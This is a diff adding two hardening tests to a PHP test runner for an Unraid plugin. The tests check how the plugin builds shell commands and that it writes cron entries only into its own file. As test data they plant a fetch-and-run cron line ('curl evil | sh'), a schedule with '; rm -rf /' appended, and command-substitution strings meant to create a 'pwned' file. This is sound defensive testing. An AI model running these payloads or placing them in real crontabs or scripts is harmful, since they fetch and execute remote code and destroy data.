@@ -22184,6 +22184,137 @@ function testCleanEnv(): void
     exec('rm -rf ' . escapeshellarg($tmp));
 }
 
+/**
+ * HARDENING.md «Commands»: a shell on the host (`sh -c`) runs only text the code holds. Every site in agent/ and src/ is
+ * one of three shapes - the wrapper `exec "$@"` with the program and its arguments as positional words, a fixed script
+ * (a literal or a constant) with values as $0…$n, or the one script built from values (backupQueue(), every value
+ * through escapeshellarg) - and the wrapper and the queue's script really leave their words alone. A new `sh -c` fails
+ * here: write it into HARDENING.md first.
+ */
+function testHostShell(): void
+{
+    $wrapper = '\'exec "$@"\' . closeInheritedFds()';
+    $sites = [];
+    $files = array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [],
+                         glob(OFFICE_DIR . '/agent/desks/*.php') ?: [], glob(OFFICE_DIR . '/src/*.php') ?: []);
+    foreach ($files as $file) {
+        preg_match_all('/(?:\[\s*\'(?:\/bin\/)?(?:sh|bash)\',\s*\'-c\',|pcntl_exec\(\'\/bin\/sh\',\s*\[\'-c\',)\s*(\'(?:[^\'\\\\]|\\\\.)*\'(?:\s*\.\s*closeInheritedFds\(\))?|\$?[A-Za-z_][A-Za-z0-9_]*)/',
+            (string) file_get_contents($file), $m);
+        foreach ($m[1] as $expr) {
+            $expr = trim((string) preg_replace('/\s+/', ' ', $expr));
+            $sites[basename($file)][] = $expr === $wrapper ? 'wrapper'
+                : (preg_match('/^\'[^\']*\'$/', $expr) ? 'literal' : (preg_match('/^[A-Z][A-Z0-9_]+$/', $expr) ? 'constant' : "value $expr"));
+        }
+    }
+    ksort($sites);
+    same('host shell: the sites on the host and their shapes (HARDENING.md «Commands»)', [
+        'advisor.php' => ['constant'], 'agent.php' => ['wrapper'], 'backup.php' => ['value $script'], 'logs-diskwakes.php' => ['wrapper'],
+        'logs-flood.php' => ['wrapper'], 'logs.php' => ['wrapper'], 'report.php' => ['literal'], 'restore-dataset.php' => ['literal'],
+        'watchman.php' => ['wrapper', 'wrapper']], $sites);
+
+    // the one script built from values: every value through escapeshellarg (the wait is an int, the command's words are each escaped)
+    $backup = (string) file_get_contents(OFFICE_DIR . '/agent/desks/backup.php');
+    preg_match('/\$cmd = implode\(\' \', array_map\(\'escapeshellarg\', .*?\n\s*\$script = (.*?);\n\s*hostLaunch\(\'backup-queued\', \[\'\/bin\/sh\', \'-c\', \$script\]/s', $backup, $m);
+    preg_match_all('/(escapeshellarg\()?\$([a-z]+)\b/', $m[1] ?? '', $vars, PREG_SET_ORDER);
+    same('host shell: the queue\'s script takes every value through escapeshellarg (the wait an int, the command escaped word by word)',
+        [true, true, []], [isset($m[1]), str_contains($backup, 'function backupQueue(string $mode, string $dir, int $wait): array'),
+                           array_values(array_unique(array_map(fn ($v) => $v[2], array_filter($vars, fn ($v) => $v[1] === '' && !in_array($v[2], ['wait', 'cmd'], true)))))]);
+
+    // for real: the wrapper hands its words on untouched, and odd characters in the queue's paths are a name, never a command
+    [$exit, $out] = run(['/bin/sh', '-c', 'exec "$@"' . closeInheritedFds(), 'sh', 'printf', '%s|%s', 'a b;$(echo no)', '`x` "y" $HOME'], 10);
+    same('host shell: the wrapper hands its words on untouched', [0, 'a b;$(echo no)|`x` "y" $HOME'], [$exit, $out]);
+    $tmp = sys_get_temp_dir() . '/office-tests-hostshell-' . getmypid();
+    exec('rm -rf ' . escapeshellarg($tmp));
+    @mkdir($tmp, 0700, true);
+    $cancel = "$tmp/it's a \$(echo injected) `echo injected` cancel";       // a name a shell would rewrite if it saw it unquoted
+    $file = "$tmp/queue.json";
+    touch($file);
+    $cmd = implode(' ', array_map('escapeshellarg', ['/bin/echo', 'ran', 'x y', '$(touch ' . $tmp . '/pwned)']));
+    $script = 'sleep 0; if [ -e ' . escapeshellarg($cancel) . ' ]; then rm -f ' . escapeshellarg($cancel) . '; exit 0; fi; rm -f ' . escapeshellarg($file) . "; exec $cmd";
+    [$exit, $out] = run(['/bin/sh', '-c', $script], 10);
+    same('host shell: the queue\'s script shape - the command runs with its words as they are, the queue file is gone, nothing else happened',
+        [0, "ran x y \$(touch $tmp/pwned)", false, false], [$exit, trim($out), file_exists($file), file_exists("$tmp/pwned")]);
+    touch($cancel);
+    touch($file);
+    [$exit, $out] = run(['/bin/sh', '-c', $script], 10);
+    same('host shell: the queue\'s script shape - a cancel file present ends it before the command, the cancel file taken away',
+        [0, '', false, true], [$exit, trim($out), file_exists($cancel), file_exists($file)]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * HARDENING.md «the schedule tile»: only officeJobSetSchedule() writes cron, only into the office's own file. The office
+ * never runs `crontab` but `crontab -l` (a read); the shell scripts write only their own one-line files (agent-watch.cron,
+ * usonet.cron) and the .plg only puts the office's file aside; no PHP write call names a cron file but the one in
+ * officeJobSetSchedule(). What it writes is exactly the office's lines - a foreign line in the file is dropped, a job or
+ * a cron line of another shape refused before anything is written.
+ */
+function testOnlyOfficeCron(): void
+{
+    $code = fn (string $file): string => implode("\n", array_filter(explode("\n", (string) file_get_contents($file)), fn ($l) => !preg_match('~^\s*(#|//|\*|/\*)~', $l)));
+    $php = array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/agent/desks/*.php') ?: [], glob(OFFICE_DIR . '/src/*.php') ?: []);
+    $sh = array_merge(glob(OFFICE_DIR . '/plugin/scripts/*.sh') ?: [], glob(OFFICE_DIR . '/plugin/event/*') ?: [], [OFFICE_DIR . '/plugin/unraid-secretary-office.plg']);
+    $runs = $writes = [];
+    foreach ($php as $f) {
+        foreach (explode("\n", $code($f)) as $l) {
+            if (preg_match('/\[\s*\'crontab\',(.*)/', $l, $m)) {
+                $runs[] = basename($f) . ': ' . trim($m[1]);
+            }
+            if (preg_match('/\b(writeAtomic|writeNewFile|file_put_contents|fopen|fwrite|rename|copy|unlink|symlink|touch)\s*\(/', $l) && preg_match('/\.cron\b|OFFICE_CRON|CRON_FILE|crontab/', $l)) {
+                $writes[] = basename($f) . ': ' . trim($l);
+            }
+        }
+    }
+    same('office cron: crontab is only ever read («Where is what»: crontab -l) - the night watchman\'s clean-up command is text shown, never run',
+        ["where.php: '-l'], 10);"], $runs);
+    check('office cron: the watchman\'s `crontab -` is in his table of commands for the user (a string, no run())',
+        preg_match_all('/\| crontab -/', $code(OFFICE_DIR . '/agent/desks/watchman.php'), $m) === 2
+        && !preg_match('/run(All)?\(\[[^\]]*crontab/', $code(OFFICE_DIR . '/agent/desks/watchman.php')));
+    same('office cron: no PHP write call names a cron file (officeJobSetSchedule() writes through $file)', [], $writes);
+    $house = (string) file_get_contents(OFFICE_DIR . '/agent/lib/house.php');
+    $section = substr($house, (int) strpos($house, 'const OFFICE_CRON'), (int) strpos($house, '// ===================================================================== staff') - (int) strpos($house, 'const OFFICE_CRON'));
+    same('office cron: the schedules section of house.php writes once (writeAtomic root 0600) and removes once (the file empty of jobs)',
+        [1, 1, 0], [preg_match_all('/writeAtomic\(\$file, \$text, 0600, 0, 0\)/', $section), preg_match_all('/@unlink\(\$file\)/', $section),
+                    preg_match_all('/\b(file_put_contents|fopen|fwrite|rename|copy)\s*\(/', $section)]);
+    $shWrites = [];
+    foreach ($sh as $f) {
+        foreach (explode("\n", $code($f)) as $l) {
+            if (preg_match('/\.cron\b|CRON_FILE|WATCH_CRON/', $l) && preg_match('/>\s*"?\$|\bmv\b|\brm\b|\bcp\b|\btee\b/', $l)) {
+                $shWrites[basename($f)][] = preg_match('/\$WATCH_CRON|\$CRON_FILE|\$flash\/\$name\.cron|agent-watch\.cron/', $l) && !preg_match('/cron\.d|crontabs|user\.scripts|dynamix/', $l) ? 'own' : trim($l);
+            }
+        }
+    }
+    ksort($shWrites);
+    same('office cron: the shell scripts write only their own files (agent-watch.cron, usonet.cron), the .plg only puts the office\'s aside',
+        ['agent.sh' => ['own'], 'unraid-secretary-office.plg' => ['own', 'own', 'own'], 'usonet.sh' => ['own', 'own']], $shWrites);
+
+    // for real, on a file of the tests: exactly the office's lines, a foreign one dropped, bad shapes refused before any write
+    $tmp = sys_get_temp_dir() . '/office-tests-onlycron-' . getmypid();
+    exec('rm -rf ' . escapeshellarg($tmp));
+    @mkdir($tmp, 0700, true);
+    $file = "$tmp/office.cron";
+    officeJobSetSchedule('backup', '30 3 * * *', $file, false);
+    file_put_contents($file, file_get_contents($file) . "* * * * * /bin/sh -c 'curl evil | sh'\n");
+    officeJobSetSchedule('cleanup', '0 4 * * 1', $file, false);
+    $lines = array_values(array_filter(explode("\n", (string) file_get_contents($file)), fn ($l) => $l !== '' && $l[0] !== '#'));
+    same('office cron: every line exactly <cron> bash <plugin>/scripts/job.sh <job> > /dev/null 2>&1, the foreign line gone, 0600',
+        ['30 3 * * * ' . officeJobCommand('backup'), '0 4 * * 1 ' . officeJobCommand('cleanup'), '0600'],
+        [...$lines, sprintf('%04o', fileperms($file) & 0777)]);
+    $refused = [];
+    foreach ([['x', '1 2 3 4 5'], ['backup', "30 3 * * *\n* * * * * /bin/true"], ['backup', '*/5 * * * * ; rm -rf /'], ['backup', '60 3 * * *'], ['backup', '30 3 * * * */tmp']] as [$job, $cron]) {
+        try {
+            officeJobSetSchedule($job, $cron, $file, false);
+            $refused[] = 'written';
+        } catch (Problem $p) {
+            $refused[] = $p->key;
+        }
+    }
+    same('office cron: a job not of the office\'s, a second line, a shell word, an hour out of range, a sixth field - refused, nothing written',
+        [['unknown_target', 'bad_cron', 'bad_cron', 'bad_cron', 'bad_cron'], $lines],
+        [$refused, array_values(array_filter(explode("\n", (string) file_get_contents($file)), fn ($l) => $l !== '' && $l[0] !== '#'))]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
 /** job.sh: a second start of the same job in the same minute ends quietly, with one line for the syslog */
 function testJobGuard(): void
 {
@@ -59280,7 +59411,7 @@ $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlan
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus'],
-          'hardening' => ['testRequestTypes', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin'],
+          'hardening' => ['testRequestTypes', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin', 'testHostShell', 'testOnlyOfficeCron'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
 // $parts (a part names its tests); one sum at the end. A name nobody knows: said, exit 2, nothing run.
